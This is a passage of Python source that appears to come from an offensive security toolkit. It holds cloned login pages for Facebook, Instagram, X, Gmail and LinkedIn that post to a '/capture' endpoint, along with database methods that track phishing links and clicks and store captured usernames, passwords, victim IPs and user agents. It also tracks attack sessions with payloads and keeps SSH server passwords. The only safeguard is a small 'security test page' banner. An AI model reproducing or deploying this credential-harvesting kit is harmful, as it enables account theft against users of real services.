        .logo h1 { color: #1877f2; font-size: 40px; margin: 0; }
        .form-group { margin-bottom: 15px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; padding: 14px 16px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .forgot-password a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .signup-link { text-align: center; margin-top: 20px; border-top: 1px solid #dadde1; padding-top: 20px; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>facebook</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="forgot-password"><a href="#">Forgotten account?</a></div>
            </form>
            <div class="signup-link"><a href="#">Create new account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background-color: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 350px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 30px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-family: 'Billabong', cursive; font-size: 50px; margin: 0; color: #262626; }
        .form-group { margin-bottom: 10px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 9px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; padding: 7px 16px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider-line { flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider-text { margin: 0 18px; color: #8e8e8e; font-weight: 600; font-size: 13px; }
        .forgot-password { text-align: center; margin-top: 12px; }
        .signup-box { background-color: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; margin-top: 10px; text-align: center; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Instagram</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
        </div>
        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body { font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #000000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #e7e9ea; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .login-box { background-color: #000000; border: 1px solid #2f3336; border-radius: 16px; padding: 48px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 40px; margin: 0; color: #e7e9ea; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background-color: #000000; border: 1px solid #2f3336; border-radius: 4px; color: #e7e9ea; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1d9bf0; color: white; border: none; border-radius: 9999px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
        .links { display: flex; justify-content: space-between; margin-top: 20px; }
        .links a { color: #1d9bf0; text-decoration: none; font-size: 14px; }
        .warning { margin-top: 20px; padding: 12px; background-color: #1a1a1a; border: 1px solid #2f3336; border-radius: 8px; color: #e7e9ea; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>𝕏</h1><h2>Sign in to X</h2></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone, email, or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Forgot password?</a><a href="#">Sign up with X</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background-color: #f0f4f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 450px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 28px; padding: 48px 40px 36px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #1a73e8; font-size: 24px; margin: 10px 0 0; }
        h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 13px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; margin-top: 20px; }
        .links { margin-top: 30px; text-align: center; }
        .links a { color: #1a73e8; text-decoration: none; font-size: 14px; margin: 0 10px; }
        .warning { margin-top: 30px; padding: 12px; background-color: #e8f0fe; border: 1px solid #d2e3fc; border-radius: 8px; color: #202124; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Gmail</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Create account</a><a href="#">Forgot email?</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif; background-color: #f3f2f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; padding: 40px 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo h1 { color: #0a66c2; font-size: 32px; margin: 0; }
        h2 { font-size: 24px; font-weight: 600; margin: 0 0 8px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #666666; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background-color: #0a66c2; color: white; border: none; border-radius: 28px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 8px; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .signup-link { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
        .warning { margin-top: 24px; padding: 12px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>LinkedIn</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">Stay updated on your professional world</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign in</button>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup-link">New to LinkedIn? <a href="#">Join now</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== Workspace Methods ====================
    def get_active_workspace(self) -> Optional[Dict]:
        """Get active workspace"""
        try:
            self.cursor.execute('SELECT * FROM workspaces WHERE active = 1')
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get active workspace: {e}")
            return None
    
    def set_active_workspace(self, name: str) -> bool:
        """Set active workspace"""
        try:
            self.cursor.execute('UPDATE workspaces SET active = 0')
            self.cursor.execute('UPDATE workspaces SET active = 1 WHERE name = ?', (name,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to set active workspace: {e}")
            return False
    
    def add_host(self, ip: str, hostname: str = None, os_info: str = None, 
                mac: str = None, vendor: str = None) -> Optional[int]:
        """Add host to database"""
        try:
            workspace = self.get_active_workspace()
            if not workspace:
                return None
            
            self.cursor.execute('''
                INSERT OR REPLACE INTO hosts 
                (workspace_id, ip_address, hostname, os_info, mac_address, vendor, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (workspace['id'], ip, hostname, os_info, mac, vendor))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add host: {e}")
            return None
    
    def add_service(self, host_id: int, port: int, protocol: str = 'tcp',
                   service: str = None, version: str = None, state: str = 'open',
                   banner: str = None) -> Optional[int]:
        """Add service to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO services 
                (host_id, port, protocol, service_name, service_version, state, banner, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (host_id, port, protocol, service, version, state, banner))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add service: {e}")
            return None
    
    def add_session(self, session_type: str, session_id: str, target_host: int = None,
                   target_port: int = None, lhost: str = None, lport: int = None,
                   payload: str = None, status: str = 'active') -> Optional[int]:
        """Add session to database"""
        try:
            self.cursor.execute('''
                INSERT INTO sessions 
                (session_type, session_id, target_host, target_port, lhost, lport, payload, status, last_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (session_type, session_id, target_host, target_port, lhost, lport, payload, status))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session last active time"""
        try:
            self.cursor.execute('''
                UPDATE sessions SET last_active = CURRENT_TIMESTAMP WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def add_route(self, subnet: str, netmask: str, gateway: str = None, session_id: int = None) -> bool:
        """Add route to database"""
        try:
            self.cursor.execute('''
                INSERT INTO routes (subnet, netmask, gateway, session_id)
                VALUES (?, ?, ?, ?)
            ''', (subnet, netmask, gateway, session_id))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add route: {e}")
            return False
    
    def get_hosts(self, workspace: str = None) -> List[Dict]:
        """Get hosts from database"""
        try:
            if workspace:
                self.cursor.execute('''
                    SELECT h.* FROM hosts h
                    JOIN workspaces w ON h.workspace_id = w.id
                    WHERE w.name = ?
                    ORDER BY h.ip_address
                ''', (workspace,))
            else:
                workspace = self.get_active_workspace()
                if workspace:
                    self.cursor.execute('SELECT * FROM hosts WHERE workspace_id = ? ORDER BY ip_address', 
                                      (workspace['id'],))
                else:
                    return []
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get hosts: {e}")
            return []
    
    def get_services(self, host_id: int = None, ip: str = None) -> List[Dict]:
        """Get services from database"""
        try:
            if host_id:
                self.cursor.execute('SELECT * FROM services WHERE host_id = ? ORDER BY port', (host_id,))
            elif ip:
                self.cursor.execute('''
                    SELECT s.* FROM services s
                    JOIN hosts h ON s.host_id = h.id
                    WHERE h.ip_address = ?
                    ORDER BY s.port
                ''', (ip,))
            else:
                return []
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get services: {e}")
            return []
    
    def get_sessions(self, status: str = 'active') -> List[Dict]:
        """Get sessions from database"""
        try:
            self.cursor.execute('''
                SELECT s.*, h.ip_address as target_ip
                FROM sessions s
                LEFT JOIN hosts h ON s.target_host = h.id
                WHERE s.status = ?
                ORDER BY s.created_at DESC
            ''', (status,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def get_routes(self, active: bool = True) -> List[Dict]:
        """Get routes from database"""
        try:
            self.cursor.execute('''
                SELECT r.*, s.session_id as via_session
                FROM routes r
                LEFT JOIN sessions s ON r.session_id = s.id
                WHERE r.active = ?
                ORDER BY r.subnet
            ''', (1 if active else 0,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get routes: {e}")
            return []
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        """Log time/date command"""
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result, timestamp)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            logger.info(f"Threat logged: {alert.threat_type} from {alert.source_ip}")
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_scan(self, scan_result: ScanResult):
        """Log scan results"""
        try:
            open_ports_json = json.dumps(scan_result.open_ports) if scan_result.open_ports else "[]"
            vulnerabilities_json = json.dumps(scan_result.vulnerabilities) if scan_result.vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, vulnerabilities, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (scan_result.target, scan_result.scan_type, open_ports_json, 
                  vulnerabilities_json, scan_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_nikto_scan(self, nikto_result: NiktoResult):
        """Log Nikto scan results"""
        try:
            vulnerabilities_json = json.dumps(nikto_result.vulnerabilities) if nikto_result.vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (nikto_result.target, vulnerabilities_json, nikto_result.output_file,
                  nikto_result.scan_time, nikto_result.success, nikto_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def log_traffic(self, traffic: TrafficGenerator, executed_by: str = "system"):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic.traffic_type, traffic.target_ip, traffic.target_port,
                  traffic.duration, traffic.packets_sent, traffic.bytes_sent,
                  traffic.status, executed_by, traffic.error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def log_connection(self, local_ip: str, local_port: int, remote_ip: str, remote_port: int,
                      protocol: str, status: str):
        """Log network connection"""
        try:
            self.cursor.execute('''
                INSERT INTO network_connections (local_ip, local_port, remote_ip, remote_port, protocol, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (local_ip, local_port, remote_ip, remote_port, protocol, status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log connection: {e}")
    
    def log_performance(self, scan_speed: float, response_time: float, packet_loss: float,
                       bandwidth: float, connections_per_sec: int):
        """Log performance metrics"""
        try:
            self.cursor.execute('''
                INSERT INTO performance_metrics (scan_speed, response_time, packet_loss, bandwidth, connections_per_sec)
                VALUES (?, ?, ?, ?, ?)
            ''', (scan_speed, response_time, packet_loss, bandwidth, connections_per_sec))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log performance: {e}")
    
    def get_performance_metrics(self, limit: int = 10) -> List[Dict]:
        """Get recent performance metrics"""
        try:
            self.cursor.execute('''
                SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get performance metrics: {e}")
            return []
    
    # ==================== IP Analysis Methods ====================
    def save_analysis(self, target_ip: str, analysis_result: Dict, report_path: str = None, 
                     graphics_path: str = None, source: str = "local") -> bool:
        """Save IP analysis to database"""
        try:
            self.cursor.execute('''
                INSERT INTO ip_analysis (target_ip, analysis_result, report_path, graphics_path, source)
                VALUES (?, ?, ?, ?, ?)
            ''', (target_ip, json.dumps(analysis_result), report_path, graphics_path, source))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save analysis: {e}")
            return False
    
    def get_recent_analyses(self, limit: int = 10) -> List[Dict]:
        """Get recent IP analyses"""
        try:
            self.cursor.execute('''
                SELECT * FROM ip_analysis ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get analyses: {e}")
            return []
    
    def get_analysis_by_ip(self, ip: str) -> List[Dict]:
        """Get analyses for specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM ip_analysis WHERE target_ip = ? ORDER BY timestamp DESC
            ''', (ip,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get analyses for IP {ip}: {e}")
            return []
    
    def block_ip(self, ip: str, reason: str, blocked_by: str = "system", analysis: Dict = None) -> bool:
        """Block an IP address"""
        try:
            analysis_json = json.dumps(analysis) if analysis else None
            self.cursor.execute('''
                INSERT OR REPLACE INTO blocked_ips (ip_address, reason, blocked_by, analysis_result)
                VALUES (?, ?, ?, ?)
            ''', (ip, reason, blocked_by, analysis_json))
            self.conn.commit()
            logger.info(f"IP {ip} blocked by {blocked_by}: {reason}")
            return True
        except Exception as e:
            logger.error(f"Failed to block IP {ip}: {e}")
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        """Unblock an IP address"""
        try:
            self.cursor.execute('''
                UPDATE blocked_ips SET is_active = 0 WHERE ip_address = ? AND is_active = 1
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to unblock IP {ip}: {e}")
            return False
    
    def get_blocked_ips(self, active_only: bool = True) -> List[Dict]:
        """Get blocked IPs"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM blocked_ips WHERE is_active = 1 ORDER BY timestamp DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM blocked_ips ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get blocked IPs: {e}")
            return []
    
    def is_ip_blocked(self, ip: str) -> bool:
        """Check if IP is blocked"""
        try:
            self.cursor.execute('''
                SELECT 1 FROM blocked_ips WHERE ip_address = ? AND is_active = 1
            ''', (ip,))
            return self.cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Failed to check blocked IP {ip}: {e}")
            return False
    
    def log_discord_command(self, user_id: str, user_name: str, target_ip: str, command: str, success: bool = True):
        """Log Discord command usage"""
        try:
            self.cursor.execute('''
                INSERT INTO discord_commands (user_id, user_name, target_ip, command, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, user_name, target_ip, command, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Discord command: {e}")
    
    # ==================== SSH Server Methods ====================
    def add_ssh_server(self, server: SSHServer) -> bool:
        """Add SSH server to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username,
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at or datetime.datetime.now().isoformat()))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_servers(self) -> List[Dict]:
        """Get all SSH servers"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        """Get SSH server by ID"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def delete_ssh_server(self, server_id: str) -> bool:
        """Delete SSH server"""
        try:
            self.cursor.execute('DELETE FROM ssh_servers WHERE id = ?', (server_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH server: {e}")
            return False
    
    def update_ssh_server_status(self, server_id: str, status: str):
        """Update SSH server status"""
        try:
            self.cursor.execute('''
                UPDATE ssh_servers 
                SET status = ?, last_used = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (status, server_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH server status: {e}")
    
    def log_ssh_command(self, server_id: str, server_name: str, command: str,
                       success: bool, output: str, error: str = None,
                       execution_time: float = 0.0, executed_by: str = "system"):
        """Log SSH command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands 
                (server_id, server_name, command, success, output, error, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server_id, server_name, command, success, output[:5000], 
                  error[:500] if error else None, execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def start_ssh_session(self, server_id: str) -> Optional[int]:
        """Start SSH session tracking"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_sessions (server_id)
                VALUES (?)
            ''', (server_id,))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to start SSH session: {e}")
            return None
    
    def end_ssh_session(self, session_id: int, commands_count: int):
        """End SSH session"""
        try:
            self.cursor.execute('''
                UPDATE ssh_sessions 
                SET end_time = CURRENT_TIMESTAMP, status = 'ended', commands_count = ?
                WHERE id = ?
            ''', (commands_count, session_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end SSH session: {e}")
    
    def get_ssh_command_history(self, server_id: str = None, limit: int = 50) -> List[Dict]:
        """Get SSH command history"""
        try:
            if server_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    WHERE server_id = ? 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (server_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH command history: {e}")
            return []
    
    # ==================== IP Management Methods ====================
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)  # Validate IP
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes, added_date)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        """Remove IP from management"""
        try:
            self.cursor.execute('''
                DELETE FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip_managed(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "block", reason, executed_by))
            
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip_managed(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock IP"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "unblock", "Manually unblocked", executed_by))
            
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                self.cursor.execute('''
                    SELECT * FROM managed_ips ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        """Get information about a specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    # ==================== Phishing Methods ====================
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, created_at, clicks, qr_code_path)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.original_url, link.phishing_url, link.template,
                  link.created_at, link.clicks, None))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_links ORDER BY created_at DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        """Get phishing link by ID"""
        try:
            self.cursor.execute('''
                SELECT * FROM phishing_links WHERE id = ?
            ''', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        """Update click count for phishing link"""
        try:
            self.cursor.execute('''
                UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?
            ''', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional_data))
            self.conn.commit()
            logger.info(f"Credentials captured for link {link_id} from {ip_address}")
            return True
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
            return False
    
